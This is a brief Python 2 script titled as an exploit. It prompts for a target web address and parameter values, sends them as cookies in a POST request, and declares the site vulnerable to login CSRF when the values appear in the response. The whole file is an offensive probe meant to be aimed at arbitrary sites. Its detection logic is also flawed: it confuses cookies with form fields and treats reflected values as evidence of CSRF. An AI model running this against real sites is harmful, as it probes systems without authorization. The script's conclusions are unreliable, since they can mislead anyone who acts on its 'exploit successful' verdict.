import requests
import sys

try:
	variables = sys.argv[1]
except Exception:
	print "[-] python exploit.py <no. of POST params>"
	exit(0)
parameter_list = []
value_list = []
cookies = {}

target = raw_input("Enter the target:")
if "https://" in target:
	pass
elif "http://" in target:
	pass
else:
	target = "https://" + target

variables = int(variables)

i=0
for i in range(variables):
	temp = raw_input("Enter the parameter" + str(i+1) + ":")
	parameter_list.append(temp)
i=0
for i in range(variables):
	print "Enter" + parameter_list[i] + ":"
	temp = raw_input()
	value_list.append(temp)

for i in range(variables):
	cookies[parameter_list[i]] = value_list[i]

try:
	post_request = requests.post(target, cookies=cookies)
except Exception:
	print "[-] Error while connecting to" + target
	print '''[-] Possible problems: *Internet connection
					*Check https:// or http://
					*Recheck the target entered'''
	exit(0)

flag = 0
if post_request.status_code == 200:
	for i in range(variables):
		if value_list[i] in post_request.text:
			flag = flag + 1
		else:
			print "[-] Exploit failed!"
			print "[-] Not vulnerable to CSRF login!"
			exit(0)
if flag == variables:
	print "[+] Exploit successfull!"
	print "[+] Vulnerable to CSRF login!"
else:
	print "[?] Unable to determine whether vulnerable!"
	print "[-] Verfiy manually!"
